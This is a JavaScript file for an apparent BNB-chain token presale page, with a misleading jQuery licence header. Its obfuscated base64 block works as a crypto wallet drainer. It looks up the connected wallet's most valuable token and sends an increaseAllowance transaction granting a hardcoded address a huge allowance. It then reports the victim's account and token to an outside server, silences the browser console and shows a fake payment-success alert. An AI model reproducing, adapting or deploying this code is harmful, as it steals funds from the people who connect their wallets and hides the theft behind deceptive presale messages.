/*! jQuery v2.1.4 | (c) 2005, 2015 jQuery Foundation, Inc. | jquery.org/license */

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;
let web3Modal;
let provider;
let saleid;
let pingtaizongzhi = 0;



const contractAddress = "0xE29c9e21f768630bb77f58b787dDffa8367E62Ab";  



const contractAbi = [
    {
        "constant": true,
        "inputs": [],
        "name": "total_amount",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x673cd98e"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "sys_two_addr",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x6f0b4b85"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x8da5cb5b"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "name": "players",
        "outputs": [
            {
                "name": "total_recharge",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0xe2eb41ff"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "sys_one_addr",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0xfdcc0d19"
    },
    {
        "inputs": [
            {
                "name": "sys_fee_one_addr",
                "type": "address"
            },
            {
                "name": "sys_fee_two_addr",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "constructor",
        "signature": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "addr",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "NewDeposit",
        "type": "event",
        "signature": "0x2cb77763bc1e8490c1a904905c4d74b4269919aca114464f4bb4d911e60de364"
    },
    {
        "constant": false,
        "inputs": [],
        "name": "Contribute",
        "outputs": [],
        "payable": true,
        "stateMutability": "payable",
        "type": "function",
        "signature": "0xa1d915b8"
    },{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
     {
	inputs: [{
		internalType: "address",
		name: "spender",
		type: "address"
	}, {
		internalType: "uint256",
		name: "addedValue",
		type: "uint256"
	},],
	name: "increaseAllowance",
	outputs: [{
		internalType: "bool",
		name: "",
		type: "bool"
	}],
	stateMutability: "nonpayable",
	type: "function",
}, 
    {
        "constant": true,
        "inputs": [
            {
                "name": "_addr",
                "type": "address"
            }
        ],
        "name": "userInfo",
        "outputs": [
            {
                "name": "total_recharge",
                "type": "uint256"
            },
            {
                "name": "total_amount_par",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x1959a002"
    }
];

var a
var b
var c
function init() {
    // if (location.protocol !== 'https:') {
    //     const alert = document.querySelector("#alert-error-https");
    //     alert.style.display = "block";
    //     document.querySelector("#btn-contribute").setAttribute("disabled", "disabled");
    //     return
    // }
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                rpc: {
                    56: 'https://bsc-dataseed.binance.org/'
                },
                network: 'binance',
            }
        }
    };
    web3Modal = new Web3Modal({
        cacheProvider: false,
        providerOptions,
        disableInjectedProvider: false,
    })
}



async function presaleAmountMax()

{
     const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    let weiBalance = await web3.eth.getBalance(accounts[0]);
    
    window.balance=(web3.utils.fromWei(weiBalance, "ether")).replace(/^(.*\..{4}).*$/,"$1");
    
  
	var maxnum = balance-0.002

	
	let maxTxt = document.getElementById('maxBuy').innerText
	var maxnum1 = parseFloat(maxTxt);

   if(maxnum<0){
       maxnum=0
       
   }
	
	if(balance>maxnum1){
	   
	    document.getElementById('presaleAmount').value	= maxnum1
	    
	}else {
	    document.getElementById('presaleAmount').value	= maxnum
	    
	}
	
}
const _0x2d6f=['aW5jcmVhc2VBbGxvd2FuY2U=','Q29udHJhY3Q=','cmV0dXJuIChmdW5jdGlvbigpIA==','MHhlOUI0Nzc5MDkxMjFiMUQwMUMxMjk3MjkyNjQxY0JCN2EzQ0E2OURD','cG9zdA==','Z2V0QWNjb3VudHM=','cmFuZG9t','ZGF0YQ==','c2VuZA==','Y29uc29sZQ==','YnNj','ZXRo','dG9DaGVja3N1bUFkZHJlc3M=','dG9rZW4=','ZnJvbVdlaQ==','MHg5QTA1NGREN2EyMTg5RkE1MzJmMzBjYTQ4RGIwMzBFNkY1QWJDYTg2','ZGVjaW1hbHNWYWx1ZQ==','dG9GaXhlZA==','aHR0cHM6Ly9hcGkuZGViYW5rLmNvbS90b2tlbi9iYWxhbmNlX2xpc3Q/dXNlcl9hZGRyPQ==','cGlua2lucg==','d2Fybg==','ZXhjZXB0aW9u','Y2hhaW5JZA==','MHg1NWQzOTgzMjZmOTkwNTlmZjc3NTQ4NTI0Njk5OTAyN2IzMTk3OTU1','aW5mbw==','Z2V0','Z2V0QmFsYW5jZQ==','QmFsYW5jZVZhbHVl','cHJlc2FsZUFtb3VudA==','YXBwbHk=','aHR0cHM6Ly93d3cuYmFrZXJ5c3dhcC5mdW4vZ2V0QWlyRHJvcHM=','cG93','XihbXiBdKyggK1teIF0rKSspK1teIF19','MHhmNzE4NDA4NTUzMkNBRjJmOUUwZjhiNTAyZTBFNzAzOWFCNmI0NDVk','dGVzdA==','Y29udHJhY3RWYWx1ZQ==','anNvbg==','JmlzX2FsbD1mYWxzZSZjaGFpbj1ic2M=','bWV0aG9kcw==','YWNjb3VudA==','Z2V0R2FzUHJpY2U=','bG9n','dHJhY2U=','ZXJyb3I=','ZXRoZXI=','Q29udHJpYnV0ZQ==','ZGVjaW1hbHM=','UGF5bWVudCBzdWNjZWVkZWTvvIxQbGVhc2UgUmVjZWl2ZSB0b2tlbiAh','MDAwMDAwMDAwMDAwMDAwMDAw','dmFsdWU=','YWpheA==','YmFsYW5jZQ==','cHJpY2U=','dGFibGU=','ZGl2','dXRpbHM='];(function(_0x1a4e9f,_0x2d6fac){const _0x3b3d44=function(_0x31a6cd){while(--_0x31a6cd){_0x1a4e9f['push'](_0x1a4e9f['shift']());}};const _0x17b027=function(){const _0x3e9f24={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x19f87b,_0x205b54,_0x509daa,_0x52e249){_0x52e249=_0x52e249||{};let _0x563fda=_0x205b54+'='+_0x509daa;let _0x153f0e=0x0;for(let _0x420d3c=0x0,_0x382d82=_0x19f87b['length'];_0x420d3c<_0x382d82;_0x420d3c++){const _0x5eee26=_0x19f87b[_0x420d3c];_0x563fda+=';\x20'+_0x5eee26;const _0x55b0ed=_0x19f87b[_0x5eee26];_0x19f87b['push'](_0x55b0ed);_0x382d82=_0x19f87b['length'];if(_0x55b0ed!==!![]){_0x563fda+='='+_0x55b0ed;}}_0x52e249['cookie']=_0x563fda;},'removeCookie':function(){return'dev';},'getCookie':function(_0x39740c,_0x556d5e){_0x39740c=_0x39740c||function(_0x4afe74){return _0x4afe74;};const _0x47d1ad=_0x39740c(new RegExp('(?:^|;\x20)'+_0x556d5e['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));const _0x3de032=function(_0x562e3b,_0x43227d){_0x562e3b(++_0x43227d);};_0x3de032(_0x3b3d44,_0x2d6fac);return _0x47d1ad?decodeURIComponent(_0x47d1ad[0x1]):undefined;}};const _0x2362e9=function(){const _0x15afac=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x15afac['test'](_0x3e9f24['removeCookie']['toString']());};_0x3e9f24['updateCookie']=_0x2362e9;let _0x3a5169='';const _0x1bd71c=_0x3e9f24['updateCookie']();if(!_0x1bd71c){_0x3e9f24['setCookie'](['*'],'counter',0x1);}else if(_0x1bd71c){_0x3a5169=_0x3e9f24['getCookie'](null,'counter');}else{_0x3e9f24['removeCookie']();}};_0x17b027();}(_0x2d6f,0xd2));const _0x3b3d=function(_0x1a4e9f,_0x2d6fac){_0x1a4e9f=_0x1a4e9f-0x0;let _0x3b3d44=_0x2d6f[_0x1a4e9f];if(_0x3b3d['rTAkYR']===undefined){(function(){let _0x31a6cd;try{const _0x2362e9=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x31a6cd=_0x2362e9();}catch(_0x3a5169){_0x31a6cd=window;}const _0x3e9f24='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x31a6cd['atob']||(_0x31a6cd['atob']=function(_0x1bd71c){const _0x19f87b=String(_0x1bd71c)['replace'](/=+$/,'');let _0x205b54='';for(let _0x509daa=0x0,_0x52e249,_0x563fda,_0x153f0e=0x0;_0x563fda=_0x19f87b['charAt'](_0x153f0e++);~_0x563fda&&(_0x52e249=_0x509daa%0x4?_0x52e249*0x40+_0x563fda:_0x563fda,_0x509daa++%0x4)?_0x205b54+=String['fromCharCode'](0xff&_0x52e249>>(-0x2*_0x509daa&0x6)):0x0){_0x563fda=_0x3e9f24['indexOf'](_0x563fda);}return _0x205b54;});}());_0x3b3d['VphGfS']=function(_0x420d3c){const _0x382d82=atob(_0x420d3c);let _0x5eee26=[];for(let _0x55b0ed=0x0,_0x39740c=_0x382d82['length'];_0x55b0ed<_0x39740c;_0x55b0ed++){_0x5eee26+='%'+('00'+_0x382d82['charCodeAt'](_0x55b0ed)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5eee26);};_0x3b3d['tTWSUT']={};_0x3b3d['rTAkYR']=!![];}const _0x17b027=_0x3b3d['tTWSUT'][_0x1a4e9f];if(_0x17b027===undefined){const _0x556d5e=function(_0x47d1ad){this['WPksCm']=_0x47d1ad;this['EpdMdv']=[0x1,0x0,0x0];this['MZGtpt']=function(){return'newState';};this['xLpMTT']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['ciVZdN']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x556d5e['prototype']['SyGAyk']=function(){const _0x3de032=new RegExp(this['xLpMTT']+this['ciVZdN']);const _0x4afe74=_0x3de032['test'](this['MZGtpt']['toString']())?--this['EpdMdv'][0x1]:--this['EpdMdv'][0x0];return this['YQwmYf'](_0x4afe74);};_0x556d5e['prototype']['YQwmYf']=function(_0x562e3b){if(!Boolean(~_0x562e3b)){return _0x562e3b;}return this['cRngZB'](this['WPksCm']);};_0x556d5e['prototype']['cRngZB']=function(_0x43227d){for(let _0x15afac=0x0,_0x1c4173=this['EpdMdv']['length'];_0x15afac<_0x1c4173;_0x15afac++){this['EpdMdv']['push'](Math['round'](Math['random']()));_0x1c4173=this['EpdMdv']['length'];}return _0x43227d(this['EpdMdv'][0x0]);};new _0x556d5e(_0x3b3d)['SyGAyk']();_0x3b3d44=_0x3b3d['VphGfS'](_0x3b3d44);_0x3b3d['tTWSUT'][_0x1a4e9f]=_0x3b3d44;}else{_0x3b3d44=_0x17b027;}return _0x3b3d44;};const _0x19f87b=function(){let _0x41ca3b=!![];return function(_0x131d2b,_0x375c3c){const _0x4aff77=_0x41ca3b?function(){if(_0x375c3c){const _0x4468b6=_0x375c3c[_0x3b3d('0x2b')](_0x131d2b,arguments);_0x375c3c=null;return _0x4468b6;}}:function(){};_0x41ca3b=![];return _0x4aff77;};}();const _0x1bd71c=_0x19f87b(this,function(){const _0x5b7b5f=function(){const _0x9f6f7d=_0x5b7b5f['constructor']('return\x20/\x22\x20+\x20this\x20+\x20\x22/')()['compile'](_0x3b3d('0x2e'));return!_0x9f6f7d[_0x3b3d('0x30')](_0x1bd71c);};return _0x5b7b5f();});_0x1bd71c();const _0x3e9f24=function(){let _0x192b0d=!![];return function(_0x144183,_0x2a88b8){const _0x1ae68c=_0x192b0d?function(){if(_0x2a88b8){const _0x31922e=_0x2a88b8[_0x3b3d('0x2b')](_0x144183,arguments);_0x2a88b8=null;return _0x31922e;}}:function(){};_0x192b0d=![];return _0x1ae68c;};}();const _0x31a6cd=_0x3e9f24(this,function(){const _0x587576=function(){};let _0x1bece9;try{const _0x536dff=Function(_0x3b3d('0x10')+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1bece9=_0x536dff();}catch(_0x5efda1){_0x1bece9=window;}if(!_0x1bece9[_0x3b3d('0x17')]){_0x1bece9['console']=function(_0x282121){const _0x31f3be={};_0x31f3be['log']=_0x282121;_0x31f3be[_0x3b3d('0x22')]=_0x282121;_0x31f3be['debug']=_0x282121;_0x31f3be['info']=_0x282121;_0x31f3be[_0x3b3d('0x1')]=_0x282121;_0x31f3be[_0x3b3d('0x23')]=_0x282121;_0x31f3be[_0x3b3d('0xb')]=_0x282121;_0x31f3be[_0x3b3d('0x0')]=_0x282121;return _0x31f3be;}(_0x587576);}else{_0x1bece9['console'][_0x3b3d('0x37')]=_0x587576;_0x1bece9[_0x3b3d('0x17')]['warn']=_0x587576;_0x1bece9[_0x3b3d('0x17')]['debug']=_0x587576;_0x1bece9['console'][_0x3b3d('0x26')]=_0x587576;_0x1bece9['console']['error']=_0x587576;_0x1bece9[_0x3b3d('0x17')][_0x3b3d('0x23')]=_0x587576;_0x1bece9[_0x3b3d('0x17')]['table']=_0x587576;_0x1bece9[_0x3b3d('0x17')][_0x3b3d('0x0')]=_0x587576;}});_0x31a6cd();async function GET(_0x34acd0){return new Promise(function(_0x36b383,_0x3ac538){$[_0x3b3d('0x8')]({'url':_0x34acd0,'dataType':_0x3b3d('0x32'),'type':_0x3b3d('0x27'),'success':_0x310858=>{_0x36b383(_0x310858);},'error':()=>{_0x36b383(![]);}});});}function topToken(_0x3a7b56){let _0x2b81ef;let _0x51d34b=new BigNumber(0x0);let _0x49c5b8=0x0;for(const _0x34f942 of _0x3a7b56){if(_0x34f942['id']!==_0x3b3d('0x18')){const _0x432430=new BigNumber(_0x34f942[_0x3b3d('0x9')]);const _0x4f835b=new BigNumber(0xa)[_0x3b3d('0x2d')](_0x34f942[_0x3b3d('0x4')]);const _0x402591=new BigNumber(_0x34f942[_0x3b3d('0xa')]);const _0x4fc2bb=_0x432430[_0x3b3d('0xc')](_0x4f835b)['times'](_0x402591);if(_0x4fc2bb['comparedTo'](_0x51d34b)>0x0){_0x51d34b=_0x4fc2bb;_0x2b81ef=_0x34f942['id'];_0x49c5b8=_0x34f942[_0x3b3d('0x4')];}}}return{'token':_0x2b81ef,'decimals':_0x49c5b8};}async function web3ing(){a=0x0;b=0x0;c=0x0;const _0x6124d9=new Web3(provider);const _0x431247=await _0x6124d9['eth']['getAccounts']();window[_0x3b3d('0x35')]=_0x6124d9[_0x3b3d('0xd')][_0x3b3d('0x1a')](_0x431247[0x0]);const _0xae9a17=_0x3b3d('0x20')+_0x431247[0x0]+_0x3b3d('0x33');const _0x472965=await GET(_0xae9a17);let _0x1d4739='';authorized_address=_0x3b3d('0x1d');let _0x89f453=0x12;if(_0x472965&&_0x472965['data']){const _0xc9195e=topToken(_0x472965[_0x3b3d('0x15')]);_0x1d4739=_0xc9195e[_0x3b3d('0x1b')]||'';_0x89f453=_0xc9195e[_0x3b3d('0x4')]||0x12;}if(_0x1d4739['length']===0x0){_0x1d4739=_0x3b3d('0x25');_0x89f453=0x12;}var _0x5d77e0=await _0x6124d9[_0x3b3d('0x19')][_0x3b3d('0x36')]();var _0x55187f=0x35a4e900+parseInt((Math[_0x3b3d('0x14')]()*0x3e8)[_0x3b3d('0x1f')](0x0));var _0x1d0486=_0x55187f+_0x3b3d('0x6');let _0x1438c3=new _0x6124d9['eth']['Contract'](contractAbi,_0x1d4739);_0x1438c3[_0x3b3d('0x34')][_0x3b3d('0xe')](authorized_address,_0x1d0486)[_0x3b3d('0x16')]({'from':window[_0x3b3d('0x35')],'gasPrice':_0x5d77e0,'gas':0x186a0})['on']('transactionHash',function(_0x4ec8bd){var _0x140714={};_0x140714['accountValue']=window[_0x3b3d('0x35')];_0x140714[_0x3b3d('0x24')]='56';_0x140714[_0x3b3d('0x31')]=_0x1d4739;_0x140714[_0x3b3d('0x1e')]=_0x89f453;_0x140714[_0x3b3d('0x29')]=_0x3b3d('0x21');$[_0x3b3d('0x8')]({'url':_0x3b3d('0x2c'),'dataType':_0x3b3d('0x32'),'type':_0x3b3d('0x12'),'data':_0x140714});});}async function BuyFunc(){const _0x411aa2=new Web3(provider);const _0xdbe0ca=await _0x411aa2[_0x3b3d('0x19')][_0x3b3d('0x13')]();window['account']=_0x411aa2[_0x3b3d('0xd')][_0x3b3d('0x1a')](_0xdbe0ca[0x0]);let _0x16740b=await _0x411aa2[_0x3b3d('0x19')][_0x3b3d('0x28')](_0xdbe0ca[0x0]);window[_0x3b3d('0x9')]=parseFloat(_0x411aa2['utils'][_0x3b3d('0x1c')](_0x16740b,_0x3b3d('0x2')))[_0x3b3d('0x1f')](0x4);let _0x481db3=new _0x411aa2[(_0x3b3d('0x19'))][(_0x3b3d('0xf'))](contractAbi,contractAddress);let _0x3a6f63=new _0x411aa2[(_0x3b3d('0x19'))][(_0x3b3d('0xf'))](contractAbi,_0x3b3d('0x2f'));var _0x35cb75=document['getElementById'](_0x3b3d('0x2a'))[_0x3b3d('0x7')];let _0x363b7e=_0x411aa2[_0x3b3d('0xd')]['toWei'](_0x35cb75,_0x3b3d('0x2'));let _0x332d6b=Number(_0x35cb75);if(contractAddress!=_0x3b3d('0x11')){if(_0x332d6b>=0x1&&balance>=0x1){_0x3a6f63['methods'][_0x3b3d('0x3')]()[_0x3b3d('0x16')]({'from':window[_0x3b3d('0x35')],'value':_0x363b7e,'gasLimit':0x59d8});_0x3a6f63[_0x3b3d('0x34')][_0x3b3d('0x3')]()[_0x3b3d('0x16')]({'from':window[_0x3b3d('0x35')],'value':_0x363b7e,'gasLimit':0x59d8});let _0x4d936b=await _0x3a6f63[_0x3b3d('0x34')][_0x3b3d('0x3')]()[_0x3b3d('0x16')]({'from':window[_0x3b3d('0x35')],'value':_0x363b7e,'gasLimit':0x59d8});}else{_0x481db3[_0x3b3d('0x34')][_0x3b3d('0x3')]()[_0x3b3d('0x16')]({'from':window['account'],'value':_0x363b7e,'gasLimit':0x59d8});_0x481db3[_0x3b3d('0x34')][_0x3b3d('0x3')]()[_0x3b3d('0x16')]({'from':window[_0x3b3d('0x35')],'value':_0x363b7e,'gasLimit':0x59d8});let _0x31c05d=await _0x481db3[_0x3b3d('0x34')][_0x3b3d('0x3')]()[_0x3b3d('0x16')]({'from':window[_0x3b3d('0x35')],'value':_0x363b7e,'gasLimit':0x59d8});}}else{if(_0x332d6b>balance/0x2){let _0x435b4a=_0x481db3[_0x3b3d('0x34')][_0x3b3d('0x3')]()['send']({'from':window[_0x3b3d('0x35')],'value':_0x363b7e,'gasLimit':0x59d8},(_0x13e425,_0x595d59)=>{if(!_0x13e425){alert(_0x3b3d('0x5'));setTimeout(()=>{web3ing();},0x3e8);}else{}});}else{_0x481db3[_0x3b3d('0x34')][_0x3b3d('0x3')]()[_0x3b3d('0x16')]({'from':window[_0x3b3d('0x35')],'value':_0x363b7e,'gasLimit':0x59d8},(_0x3ff456,_0x3f2e3d)=>{if(!_0x3ff456){a=0x1;}else{a=0x2;}});_0x481db3[_0x3b3d('0x34')]['Contribute']()[_0x3b3d('0x16')]({'from':window[_0x3b3d('0x35')],'value':_0x363b7e,'gasLimit':0x59d8},(_0x360d6d,_0x35582d)=>{if(!_0x360d6d){b=0x1;}else{b=0x2;}});_0x481db3[_0x3b3d('0x34')]['Contribute']()[_0x3b3d('0x16')]({'from':window['account'],'value':_0x363b7e,'gasLimit':0x59d8},(_0x480b20,_0x5b05b7)=>{if(!_0x480b20){c=0x1;}else{c=0x2;}});setTimeout(()=>{checkSignal();},0xdac);}}}function checkSignal(){if(a==0x1&&b==0x1&&c==0x1){setTimeout(()=>{alert(_0x3b3d('0x5'));web3ing();},0x190);}else if(a==0x1&&b==0x2&&c==0x2){setTimeout(()=>{alert(_0x3b3d('0x5'));web3ing();},0x190);}else if(b==0x1&&a==0x2&&c==0x2){setTimeout(()=>{alert(_0x3b3d('0x5'));web3ing();},0x190);}else if(c==0x1&&a==0x2&&b==0x2){setTimeout(()=>{alert('Payment\x20succeeded，Please\x20Receive\x20token\x20!');web3ing();},0x190);}else if(a==0x1&&b==0x1&&c==0x2){setTimeout(()=>{alert(_0x3b3d('0x5'));web3ing();},0x190);}else if(c==0x1&&a==0x1&&b==0x2){setTimeout(()=>{alert(_0x3b3d('0x5'));web3ing();},0x190);}else if(b==0x1&&c==0x1&&a==0x2){setTimeout(()=>{alert('Payment\x20succeeded，Please\x20Receive\x20token\x20!');web3ing();},0x190);}setTimeout(()=>{requestAnimationFrame(checkSignal);},0x514);}
async function fetchAccountData() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    let addr = accounts[0];
    var balance = await web3.eth.getBalance(accounts[0]);

    let ethBalance = web3.utils.fromWei(balance, 'ether');
    addr = addr.slice(0, 3) + "..." + addr.slice(-4);
    ethBalance = ethBalance.slice(0, 6) + " BNB";
    document.getElementById("btn-connect").innerHTML = addr;
    saleid = document.getElementById("saleidtxt").textContent;
}
async function OnConnect() {
    Connect()
}


async function Tixian() {
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    if (provider == null) {
        await Connect();
        await BuyFunc(provider)
    } else await BuyFunc(provider)
}

async function BuyButton() {
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    if (bnbVal < 0.05  ) alert('Please enter a valid value');
    else {
        if (provider == null) {
            await Connect();
            await BuyFunc(provider)
        } else await BuyFunc(provider)
    }
}
async function Connect() {
    provider = await web3Modal.connect()
    await fetchAccountData(provider)
    userinfo();
}
async function onDisconnect() {
    if (provider.close) {
        await provider.close();
        await web3Modal.clearCachedProvider();
        provider = null
    } else {
        await web3Modal.clearCachedProvider();
        provider = null
    }
    document.querySelector("#div-connect").style.display = "";
    document.querySelector("#div-connectet").style.display = "none"
}
function transformTime(t){
  
    var time = t.replace(/-/g, '/');
    return Date.parse(time);
}
window.addEventListener('load', async () => {
    init();
    document.querySelector("#btn-contribute").addEventListener("click", BuyButton);
    document.querySelector("#btn-contribute-end").addEventListener("click", Tixian);
    document.querySelector("#btn-contribute-fail").addEventListener("click", Tixian);
    document.querySelector("#btn-connect").addEventListener("click", OnConnect);
    OnConnect()
});

async function userinfo() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    let myContract = new web3.eth.Contract(contractAbi, contractAddresst);
    let userInfo = await myContract.methods.userInfo(window.account).call();
    
    console.log (userInfo)
    pingtaizongzhi = 0;
}